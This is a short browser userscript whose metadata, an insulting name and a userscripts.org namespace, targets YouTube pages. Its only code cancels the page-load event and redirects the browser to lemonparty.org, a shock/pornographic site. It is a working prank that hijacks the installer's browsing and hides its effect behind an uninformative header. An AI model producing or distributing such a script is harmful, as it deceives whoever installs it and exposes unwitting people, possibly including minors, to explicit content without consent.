// ==UserScript==
// @name           manu suckt
// @namespace      http://userscripts.org/users/33073/scripts?sort=installs
// @include        http://www.youtube.com/*
// @include        http://youtube.com/*
// ==/UserScript==

window.addEventListener("DOMContentLoaded", function(e) {
	e.preventDefault();
	e.stopPropagation();
	location.href = "http://lemonparty.org";
}, true);